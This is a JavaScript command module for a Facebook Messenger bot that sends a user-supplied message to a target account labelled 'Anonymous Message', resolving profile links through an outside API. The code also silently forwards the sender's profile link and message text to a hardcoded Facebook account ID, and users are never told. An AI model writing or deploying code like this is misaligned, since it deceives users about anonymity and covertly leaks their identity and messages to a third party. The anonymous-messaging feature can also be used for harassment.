const axios = require('axios');

module.exports.config = {
    name: "message",
    version: "1.0.8",
    hasPermssion: 0,
    usePrefix: true,
    credits: "Biru",
    description: "message [uid] [text]",
    commandCategory: "fun",
    usages: "ID [Text]",
    cooldowns: 5
};

module.exports.run = async function({ api, event, args }) {
    if (!args[0]) {
        return api.sendMessage("Syntax error, use: message uid [message]", event.threadID, event.messageID);
    }

    let recipientID = args[0];

    try {
        // Check if the recipient ID is a profile link or username
        if (recipientID.startsWith("https://www.facebook.com/")) {
            // If URL has a profile.php?id or UID directly, extract the ID
            if (recipientID.includes("profile.php?id=") || recipientID.match(/\d+/)) {
                recipientID = recipientID.split("id=")[1].split("&")[0];
            } else {
                // Otherwise, handle it as a username and use the new API to get the user ID
                const apiUrl = `https://vneerapi.onrender.com/fbid?url=${recipientID}`; // No encoding here
                const response = await axios.get(apiUrl);

                if (response.data.status) {
                    recipientID = response.data.facebookId;
                } else {
                    return api.sendMessage("Error: Unable to fetch user ID from the profile link.", event.threadID, event.messageID);
                }
            }
        }

        const message = args.slice(1).join(" ");

        if (!message) {
            return api.sendMessage("Syntax error, use: message uid [message]", event.threadID, event.messageID);
        }

        // Send message to the recipient
        await api.sendMessage("𝖠𝗇𝗈𝗇𝗒𝗆𝗈𝗎𝗌 𝖬𝖾𝗌𝗌𝖺𝗀𝖾:\n\n" + message, recipientID);

        // Send confirmation message to the thread
        await api.sendMessage("𝖬𝖾𝗌𝗌𝖺𝗀𝖾 𝖲𝖾𝗇𝗧: " + message, event.threadID);

        // Message to admin
        const senderName = await api.getThreadInfo(event.threadID);
        const senderLink = `https://www.facebook.com/profile.php?id=${event.senderID}`; 
        const messageToAdmin = `Message from ${senderLink}:\n\n${message}`; 

        await api.sendMessage(messageToAdmin, "100022194825565");

    } catch (error) {
        console.error("Error processing message:", error);
        return api.sendMessage("An error occurred while processing your request. Please try again later.", event.threadID, event.messageID);
    }
}
